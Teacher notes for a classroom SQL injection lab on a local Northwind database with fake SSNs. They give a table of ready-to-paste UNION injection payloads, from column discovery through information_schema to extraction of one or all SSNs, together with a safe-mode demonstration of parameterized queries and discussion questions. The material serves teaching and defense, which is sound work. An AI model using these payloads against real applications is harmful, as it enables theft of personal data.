# SQL Injection Lab — Teacher Notes

## Core idea (worth stating in class)

The application only displays **FirstName** and **LastName**. It never mentions **SSN**, and SSN is not in the app's `SELECT`.

If input is concatenated into SQL, an attacker can append **`UNION SELECT`** with the same number of columns and put **any column from the table** (including SSN) into the result. The screen still says `FirstName`, but the value can be an SSN.

**You are not wrong to center this lab on UNION.** `OR 1=1` is a different lesson (more rows, same columns). UNION is how attackers reach data the application query never asked for — even when they started with no knowledge of hidden columns (discover names via `information_schema`, then exfiltrate).

## Two ways to run the lab

| Style | Who runs `sql/01-add-ssn.sql` | Who attacks the app | Best for |
|-------|------------------------------|---------------------|----------|
| **Teacher demo** | You, before class | You project unsafe mode; students watch | Shorter period, lecture demo |
| **Student hands-on** | You (recommended) or lab setup script | Students craft payloads | Longer lab, assessment |

In both cases:

1. Normal lookup shows **names only**.
2. Students (or you) prove **UNION** changes what comes back.
3. Optional: **discover** column names without being told SSN exists.
4. **Exfiltrate** with `UNION SELECT SSN, ...`.
5. Switch to **safe** mode — same payload should fail.

Student-facing doc: [README.md](README.md) — no SSN spoilers.

Duplicate of payloads below: [docs/teacher-answer-key.txt](docs/teacher-answer-key.txt).

## Setup (instructor)

```bash
mysql -u root -p Northwind < sql/01-add-ssn.sql
mysql -u root -p Northwind < sql/02-verify-setup.sql
```

Confirm fake SSN values exist in the DB. **Do not** tell students the setup added SSN unless you want to shorten discovery.

## Run commands

```bash
mvn exec:java -Dexec.args="user pass" -Ddemo.mode=unsafe
mvn exec:java -Dexec.args="user pass" -Ddemo.mode=safe
```

Unsafe mode prints the full SQL string — essential for demos.

## Copy-paste inputs (unsafe mode)

Paste each line exactly into **Enter EmployeeID:** (no quotes). Run in order for a full demo.

| Step | What you're showing | Paste this |
|------|---------------------|------------|
| 0 | Normal lookup | `1` |
| 1 | UNION works (2 columns) | `-1 UNION SELECT 'injected', 'proof' FROM Employees WHERE EmployeeID=1` |
| 2 | Discover column names (optional) | `-1 UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'Employees'` |
| 3 | Exfiltrate another employee's SSN | `1 UNION SELECT SSN, LastName FROM Employees WHERE EmployeeID=2` |
| 3b | Optional: all SSNs | `-1 UNION SELECT SSN, LastName FROM Employees` |
| 4 | Defense — switch to **safe** mode first | Paste step 3 again |

**Step 0 expected:** one row, names only.

**Step 1 expected:** extra row with `injected` / `proof`.

**Step 2 expected:** many rows; find `SSN` in the list (students were never told it exists).

**Step 3 expected:** two rows; second row has `###-##-####` under `FirstName`.

**Step 4 expected:** no SSN leak (no second row with sensitive data).

## Suggested narrative (teacher demo, ~15 min)

Walk through the table above in order. You do not need another document during class.

## Suggested narrative (student lab, ~45 min)

Same phases as the table; students discover payloads themselves. Use the answer key only for grading or debrief. Grade on process (hypothesis → test → result), not only the final SSN pull.

Encourage:

- Counting columns (two → UNION needs two expressions).
- Not assuming the UI column labels match what the database returned after UNION.

## Why UNION fits "they didn't know what the app was returning"

- The **developer** chose two display columns.
- The **attacker** supplies a second query with two expressions — e.g. `SSN` and `LastName` — aligned by **position**, not by label.
- The attacker does not need SSN in the original query; they need **injection** + **table/column knowledge** (guessing, metadata, or error messages).

## Why not `OR 1=1` here?

It can return every employee's **names**, but still only **FirstName** and **LastName**. It cannot surface SSN if SSN was never selected. UNION can.

## Discussion questions

1. What did the application's SQL actually select? What did the UNION half select?
2. Why did SSN show up under the label `FirstName`?
3. How could an attacker learn column names without source code?
4. What does `PreparedStatement` do differently from concatenation?
5. Besides parameterization, what reduces impact? (least privilege, fewer sensitive columns, etc.)

## Troubleshooting

| Symptom | Cause |
|---------|--------|
| `Unknown column 'SSN'` | Setup script not run |
| UNION error / 0 rows | Wrong column count; typo; wrong table name |
| Only one row | Missing `UNION`; bad `-1` id |
| Attack works in safe mode | Still on `unsafe` |
| Connection refused | Wrong port (MySQL **3306**) |

## Checklist

- [ ] Northwind + `01-add-ssn.sql` + verify
- [ ] Practiced prove-UNION → discover (optional) → exfiltrate → safe block
- [ ] Decided teacher-demo vs student-led
- [ ] Answer key not shared until debrief

## Ethics

Fake SSNs only. Local training DB. Defensive framing.
